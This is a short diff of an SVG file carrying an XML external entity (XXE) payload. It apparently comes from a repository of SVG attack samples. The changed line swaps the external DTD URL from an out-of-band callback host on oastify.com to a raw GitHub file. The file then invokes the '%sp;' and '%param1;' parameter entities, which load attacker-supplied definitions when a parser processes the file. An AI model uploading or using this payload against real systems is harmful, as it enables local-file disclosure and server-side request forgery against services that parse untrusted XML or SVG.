@@ -1,7 +1,7 @@
 <?xml version="1.0" standalone="yes"?>
 <!DOCTYPE svg [
 <!ELEMENT svg ANY >
-<!ENTITY % sp SYSTEM "http://f1hu92ya8whkrdtauf9hxsyd046vumpae.oastify.com/xxe.xml">
+<!ENTITY % sp SYSTEM "https://raw.githubusercontent.com/studienka/XSS-SVG/refs/heads/main/xxe.xml">
 %sp;
 %param1;
 ]>
